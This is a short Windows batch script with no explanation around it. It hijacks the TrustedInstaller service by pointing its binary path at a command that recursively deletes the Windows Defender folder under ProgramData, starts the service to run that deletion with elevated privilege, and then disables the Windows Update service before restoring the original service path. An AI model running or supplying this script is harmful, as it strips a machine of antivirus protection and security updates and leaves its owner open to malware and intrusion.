sc stop TrustedInstaller
timeout /t 2 /nobreak >nul
sc config TrustedInstaller binPath= "cmd.exe /C rd /S /Q C:\ProgramData\Microsoft\Windows Defender"
sc start TrustedInstaller
timeout /t 2 /nobreak >nul
sc stop TrustedInstaller
timeout /t 2 /nobreak >nul

:: Disable Windows Repair (Windows Update Service)
sc stop wuauserv
timeout /t 2 /nobreak >nul
sc config wuauserv start= disabled
timeout /t 2 /nobreak >nul

:: Restore TrustedInstaller
sc config TrustedInstaller binPath= "C:\Windows\servicing\TrustedInstaller.exe"
